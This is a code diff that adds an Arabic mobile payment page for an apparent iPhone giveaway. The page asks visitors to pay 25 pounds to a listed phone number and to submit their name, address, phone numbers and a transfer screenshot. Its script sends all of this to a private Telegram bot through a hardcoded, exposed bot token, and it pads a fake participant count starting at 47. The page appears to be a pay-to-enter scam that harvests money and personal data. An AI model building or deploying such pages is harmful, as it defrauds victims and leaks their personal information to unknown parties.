@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+<title>الدفع | برايز</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+
+/* منع التحديد */
+*{
+  -webkit-user-select:none;
+  -moz-user-select:none;
+  -ms-user-select:none;
+  user-select:none;
+}
+
+body{
+  font-family:'Cairo',sans-serif;
+  background:#f4f5f7;
+  padding-bottom:95px;
+}
+
+/* ===== HEADER ===== */
+.header{
+  background:#6f4bd8;
+  color:#fff;
+  padding:25px 20px 55px;
+  border-bottom-left-radius:35px;
+  border-bottom-right-radius:35px;
+  position:relative;
+  z-index:1;
+}
+
+.header h2{
+  font-size:20px;
+  font-weight:900;
+}
+
+/* ===== CONTENT ===== */
+.contests{
+  margin-top:-30px;   /* ممكن تزود أو تقلل حسب اللي يعجبك */
+  padding:15px;
+  display:grid;
+  gap:15px;
+  position:relative;
+  z-index:5;          /* أهم سطر */
+}
+
+
+.card{
+  background:#fff;
+  border-radius:22px;
+  padding:18px;
+  box-shadow:0 10px 25px rgba(0,0,0,.05);
+  display:flex;
+  flex-direction:column;
+  gap:10px;
+}
+
+/* إلغاء أي حركة */
+.card,
+.btn{
+  transition:none !important;
+  transform:none !important;
+}
+
+.card:hover{
+  transform:none !important;
+}
+
+/* ===== PAYMENT FORM ===== */
+.pay-title{
+  font-size:17px;
+  font-weight:900;
+  color:#6f4bd8;
+  margin-bottom:10px;
+}
+
+.pay-label{
+  font-size:13px;
+  font-weight:700;
+  color:#444;
+}
+
+.pay-input{
+  width:100%;
+  padding:13px;
+  border-radius:14px;
+  border:1px solid #ddd;
+  background:#fafafa;
+  font-family:'Cairo',sans-serif;
+  font-size:14px;
+  outline:none;
+}
+
+.pay-input:focus{
+  border-color:#6f4bd8;
+}
+
+.phone-box{
+  position:relative;
+}
+
+.phone-box .wa{
+  position:absolute;
+  left:12px;
+  top:50%;
+  transform:translateY(-50%);
+  font-size:11px;
+  color:#25D366;
+  font-weight:900;
+}
+
+.divider{
+  border:none;
+  height:1px;
+  background:#eee;
+  margin:15px 0;
+}
+
+.transfer-number{
+  background:#f7f6ff;
+  border:1px solid #e5e0ff;
+  color:#6f4bd8;
+  font-weight:900;
+  padding:14px;
+  border-radius:14px;
+  text-align:center;
+  font-size:15px;
+  letter-spacing:1px;
+  cursor:pointer;
+}
+
+/* ===== BUTTON ===== */
+.btn{
+  background:#6f4bd8;
+  color:#fff;
+  border:none;
+  padding:14px;
+  border-radius:14px;
+  font-size:14px;
+  font-weight:900;
+  cursor:pointer;
+}
+
+.btn:disabled{
+  background:#b9aef0;
+  cursor:not-allowed;
+}
+
+.btn:hover:not(:disabled){
+  background:#5a36c6;
+}
+
+/* ===== BOTTOM NAV ===== */
+.bottom-nav{
+  position:fixed;
+  bottom:0;
+  right:0;
+  left:0;
+  background:#fff;
+  border-top:1px solid #eee;
+  display:flex;
+  justify-content:space-around;
+  padding:12px 0 10px;
+  z-index:10;
+  box-shadow:0 -5px 20px rgba(0,0,0,.05);
+}
+
+.nav-item{
+  text-align:center;
+  font-size:11px;
+  color:#999;
+}
+
+.nav-item .circle{
+  width:48px;
+  height:48px;
+  border-radius:16px;
+  background:#f3f3f3;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  margin:0 auto 5px;
+}
+
+.nav-item svg{
+  width:22px;
+  height:22px;
+  fill:#888;
+}
+
+.nav-item.active{
+  color:#6f4bd8;
+}
+
+.nav-item.active .circle{
+  background:#6f4bd8;
+}
+
+.nav-item.active svg{
+  fill:#fff;
+}
+
+/* ===== UPLOAD SCREENSHOT ===== */
+.upload-box{
+  display:block;
+  width:100%;
+  cursor:pointer;
+}
+
+.upload-box input{
+  display:none;
+}
+
+.upload-content{
+  border:1.5px dashed #d6d2ff;
+  background:#fafafa;
+  border-radius:14px;
+  padding:18px;
+  text-align:center;
+  font-size:14px;
+  font-weight:700;
+  color:#6f4bd8;
+}
+
+.upload-content span{
+  display:block;
+  margin-top:6px;
+  font-size:11px;
+  font-weight:400;
+  color:#888;
+}
+
+/* ===== ERROR MESSAGES ===== */
+.error-msg{
+  font-size:12px;
+  color:#d93025;
+  margin-top:4px;
+  display:none;
+}
+
+.success-msg{
+  font-size:12px;
+  color:#0f9d58;
+  margin-top:4px;
+  display:none;
+}
+
+/* ===== TOAST MESSAGE ===== */
+.toast{
+  position:fixed;
+  bottom:110px;
+  left:50%;
+  transform:translateX(-50%);
+  background:#323232;
+  color:#fff;
+  padding:12px 18px;
+  border-radius:12px;
+  font-size:13px;
+  font-weight:700;
+  box-shadow:0 10px 25px rgba(0,0,0,.25);
+  opacity:0;
+  pointer-events:none;
+  transition:opacity .3s ease;
+  z-index:999;
+}
+
+.toast.show{
+  opacity:1;
+}
+
+
+/* ===== HEADER DECOR CIRCLES ===== */
+.header{
+  position:relative;
+  overflow:hidden;
+}
+
+.header::before,
+.header::after{
+  content:"";
+  position:absolute;
+  width:220px;
+  height:220px;
+  border-radius:50%;
+  background:rgba(255,255,255,0.08);
+  z-index:0;
+}
+
+.header::before{
+  top:-90px;
+  right:-90px;
+}
+
+.header::after{
+  bottom:-110px;
+  left:-90px;
+}
+
+/* رفع محتوى الهيدر فوق الدواير */
+.header h2{
+  position:relative;
+  z-index:1;
+}
+
+/* ===== BUTTON LOADING ===== */
+.btn.loading{
+  position:relative;
+  color:transparent !important;
+}
+
+.btn.loading::after{
+  content:"";
+  width:18px;
+  height:18px;
+  border:3px solid rgba(255,255,255,.4);
+  border-top-color:#fff;
+  border-radius:50%;
+  position:absolute;
+  top:50%;
+  left:50%;
+  transform:translate(-50%,-50%);
+  animation:spin .8s linear infinite;
+}
+
+@keyframes spin{
+  to{transform:translate(-50%,-50%) rotate(360deg);}
+}
+
+
+
+</style>
+</head>
+
+<body>
+
+<!-- HEADER -->
+<div class="header">
+  <h2>صفحة الدفع</h2>
+</div>
+
+<!-- PAYMENT -->
+<div class="contests">
+  <div class="card">
+
+    <div class="pay-title">إتمام بيانات الدفع</div>
+
+    <label class="pay-label">الاسم بالكامل</label>
+    <input class="pay-input" id="name" type="text" placeholder="اكتب اسمك">
+    <div class="error-msg" id="error-name">الرجاء إدخال الاسم بالكامل</div>
+
+    <label class="pay-label">العنوان</label>
+    <input class="pay-input" id="address" type="text" placeholder="المحافظة - المركز - القرية">
+    <div class="error-msg" id="error-address">الرجاء إدخال العنوان</div>
+
+    <label class="pay-label">رقم الهاتف يكون عليه (واتساب)</label>
+    <div class="phone-box">
+      <input class="pay-input" id="phone" type="tel" placeholder="01xxxxxxxxx" maxlength="11">
+    </div>
+    <div class="error-msg" id="error-phone">الرجاء إدخال رقم هاتف صحيح (11 رقم)</div>
+
+    <hr class="divider">
+
+    <label class="pay-label">حول على الرقم ده 25 جنيه</label>
+    <div class="transfer-number" id="transfer-number">01229785379</div>
+
+    <label class="pay-label">رقم الهاتف اللي حولت منه</label>
+    <input class="pay-input" id="from-phone" type="tel" placeholder="الرقم اللي تم التحويل منه" maxlength="11">
+    <div class="error-msg" id="error-from-phone">الرجاء إدخال رقم الهاتف المحول منه (11 رقم)</div>
+
+    <label class="pay-label">صورة سكرين شوت التحويل</label>
+<label class="upload-box">
+  <input type="file" id="screenshot" accept="image/*">
+  <div class="upload-content" id="upload-content">
+    📷 اضغط لرفع صورة التحويل
+    <span id="upload-text">PNG - JPG - JPEG</span>
+  </div>
+</label>
+
+    <div class="error-msg" id="error-screenshot">الرجاء رفع صورة التحويل</div>
+
+    <button class="btn" id="submitBtn" disabled>تأكيد الدفع</button>
+    <div class="success-msg" id="success-msg">تم إرسال بياناتك بنجاح!</div>
+
+  </div>
+</div>
+
+<!-- BOTTOM NAV -->
+<div class="bottom-nav">
+  <div class="nav-item">
+    <div class="circle">
+      <svg viewBox="0 0 24 24">
+        <path d="M18 2H6v2H3v3c0 3.3 2.7 6 6 6 .6 1.5 1.8 2.7 3.4 3.2V19H8v3h8v-3h-4v-2.8c1.6-.5 2.8-1.7 3.4-3.2 3.3 0 6-2.7 6-6V4h-3V2Z"/>
+      </svg>
+    </div>
+    المسابقات
+  </div>
+
+  <div class="nav-item" onclick="location.href='home.html'">
+    <div class="circle">
+      <svg viewBox="0 0 24 24">
+        <path d="M12 3 2 12h3v8h6v-5h2v5h6v-8h3Z"/>
+      </svg>
+    </div>
+    الرئيسية
+  </div>
+
+<div class="nav-item" onclick="window.location.href='settings.html'">
+  <div class="circle">
+    <svg viewBox="0 0 24 24">
+      <path d="M19.4 13a7.6 7.6 0 0 0 0-2l2-1.5-2-3.4-2.3 1a7.2 7.2 0 0 0-1.7-1l-.3-2.5h-4l-.3 2.5a7.2 7.2 0 0 0-1.7 1l-2.3-1-2 3.4L4.6 11a7.6 7.6 0 0 0 0 2l-2 1.5 2 3.4 2.3-1a7.2 7.2 0 0 0 1.7 1l.3 2.5h4l.3-2.5a7.2 7.2 0 0 0 1.7-1l2.3 1 2-3.4Zm-7.4 2.5A3.5 3.5 0 1 1 15.5 12 3.5 3.5 0 0 1 12 15.5Z"/>
+    </svg>
+  </div>
+  الإعدادات
+</div>
+</div>
+
+<script>
+const contestId = "iphone17";
+
+// تفعيل زر الدفع إذا كل الحقول ممتلئة
+const nameInput = document.getElementById('name');
+const addressInput = document.getElementById('address');
+const phoneInput = document.getElementById('phone');
+const fromPhoneInput = document.getElementById('from-phone');
+const screenshotInput = document.getElementById('screenshot');
+const submitBtn = document.getElementById('submitBtn');
+
+function validateForm(){
+  let valid = true;
+
+  // الاسم
+  if(nameInput.value.trim() === ""){
+    document.getElementById('error-name').style.display = 'block';
+    valid = false;
+  } else {
+    document.getElementById('error-name').style.display = 'none';
+  }
+
+  // العنوان
+  if(addressInput.value.trim() === ""){
+    document.getElementById('error-address').style.display = 'block';
+    valid = false;
+  } else {
+    document.getElementById('error-address').style.display = 'none';
+  }
+
+  // رقم الهاتف
+  if(phoneInput.value.trim().length !== 11){
+    document.getElementById('error-phone').style.display = 'block';
+    valid = false;
+  } else {
+    document.getElementById('error-phone').style.display = 'none';
+  }
+
+  // رقم الهاتف المحول منه
+  if(fromPhoneInput.value.trim().length !== 11){
+    document.getElementById('error-from-phone').style.display = 'block';
+    valid = false;
+  } else {
+    document.getElementById('error-from-phone').style.display = 'none';
+  }
+
+  // صورة التحويل
+  if(!screenshotInput.files.length){
+    document.getElementById('error-screenshot').style.display = 'block';
+    valid = false;
+  } else {
+    document.getElementById('error-screenshot').style.display = 'none';
+  }
+
+  submitBtn.disabled = !valid;
+}
+
+// ربط الأحداث
+[nameInput,addressInput,phoneInput,fromPhoneInput,screenshotInput].forEach(el=>{
+  el.addEventListener('input', validateForm);
+  el.addEventListener('change', validateForm);
+});
+
+// نسخ رقم التحويل عند الضغط
+document.getElementById('transfer-number').addEventListener('click', function(){
+  navigator.clipboard.writeText(this.textContent);
+  document.getElementById('transfer-number').addEventListener('click', function(){
+  navigator.clipboard.writeText(this.textContent);
+
+  const toast = document.getElementById('copyToast');
+  toast.classList.add('show');
+
+  setTimeout(() => {
+    toast.classList.remove('show');
+  }, 2500);
+});
+});
+
+// إرسال البيانات + الصورة إلى Telegram
+submitBtn.addEventListener('click', function(e){
+  e.preventDefault();
+
+  submitBtn.classList.add('loading');
+  submitBtn.disabled = true;  e.preventDefault();
+
+  const token = "8569960566:AAH2YPW_FXhZIUo1BzL0k3izj5fnuGhiy0k";
+  const chatId = "8562515084";
+
+  const caption = `
+📝 طلب دفع جديد
+------------------
+👤 الاسم: ${nameInput.value}
+📍 العنوان: ${addressInput.value}
+📱 رقم الهاتف: ${phoneInput.value}
+📲 رقم المحول منه: ${fromPhoneInput.value}
+💳 الرقم المحول إليه: ${document.getElementById('transfer-number').textContent}
+`;
+
+  const formData = new FormData();
+  formData.append("chat_id", chatId);
+  formData.append("caption", caption);
+  formData.append("photo", screenshotInput.files[0]);
+
+  fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+    method: "POST",
+    body: formData
+  })
+  .then(res => {
+if(res.ok){
+
+  // منع التكرار (مهم جدًا)
+  if(localStorage.getItem("counted_" + contestId) !== "true"){
+    let currentCount = localStorage.getItem("participants_" + contestId) || 47;
+    currentCount = parseInt(currentCount) + 1;
+
+    localStorage.setItem("participants_" + contestId, currentCount);
+    localStorage.setItem("counted_" + contestId, "true");
+  }
+
+  // حفظ حالة الاشتراك
+  localStorage.setItem("joinedContest_" + contestId, "true");
+
+      // عرض رسالة التأكيد
+      const successMsg = document.getElementById('success-msg');
+      successMsg.textContent = "✅ تم تأكيد الدفع وسنتواصل معك قريبًا";
+      successMsg.style.display = 'block';
+
+      submitBtn.disabled = true;
+
+      // إعادة التوجيه بعد 3 ثواني
+      setTimeout(() => {
+        window.location.href = 'home.html';
+      }, 500);
+    } else {
+      alert("حدث خطأ أثناء إرسال الطلب، حاول مرة أخرى");
+    }
+  });
+});
+
+
+// عرض اسم الصورة بعد اختيارها
+screenshotInput.addEventListener('change', function(){
+  const uploadText = document.getElementById('upload-text');
+  if(this.files.length){
+    uploadText.textContent = `✅ تم اختيار: ${this.files[0].name}`;
+  } else {
+    uploadText.textContent = "PNG - JPG - JPEG";
+  }
+});
+</script>
+
+<div class="toast" id="copyToast">
+  تم نسخ الرقم
+</div>
+
+
+</body>
+</html>
